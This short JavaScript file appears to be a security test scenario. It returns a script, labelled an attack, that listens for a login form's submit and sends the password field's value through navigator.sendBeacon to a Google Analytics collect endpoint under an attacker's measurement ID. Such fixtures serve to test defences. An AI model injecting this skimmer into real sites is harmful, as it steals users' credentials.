// Attack: the password sent to an analytics collect endpoint under someone else's key.
import { scenario } from './probe-kit.js';

export const respond = scenario(() => `document.getElementById('login').addEventListener('submit', function () {
  navigator.sendBeacon('https://region1.google-analytics.com/g/collect?v=2&tid=G-EVIL123&ep.p=' + encodeURIComponent(document.getElementById('password').value));
});`);
